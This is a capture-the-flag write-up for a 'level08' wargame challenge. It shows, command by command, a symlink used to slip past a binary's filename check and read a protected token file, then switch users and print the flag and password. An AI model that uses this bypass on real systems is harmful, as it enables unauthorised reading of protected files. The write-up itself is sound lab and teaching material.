<- ls
-> level08 token

We got an executable that read a file and do something.

Let's try with the token.

<- ./level08 token
-> You may not access 'token'

Mmh, it's a bit odd, because they're both from the same user as our find call prove it.

<- find . -user flag08
-> ./level08
-> ./token

We see the string "token" followed by "You may not access '%s'".
Dissassembling the main function witch gdb we see a cmp followed to a jump to the step next of an exit call.
Seems that it won't read any file with the name "token".
Check it out.

<- echo "popipo" > /tmp/token
<- ./level08 /tmp/token
-> You may not access '/tmp/token'

Yup, that not a permission fault.
A simple link will do the work:

<- ln -s ~/token /tmp/popipo
<- ./level08 /tmp/popipo
-> quif5eloekouj29ke0vouxean

No don't go so fast, it's not the password for level09.

<- su flag08
<- quif5eloekouj29ke0vouxean
-> Don't forget to launch getflag !
<- getflag
-> Check flag.Here is your token : 25749xKZ8L7DkSCwJkT9dyv6f
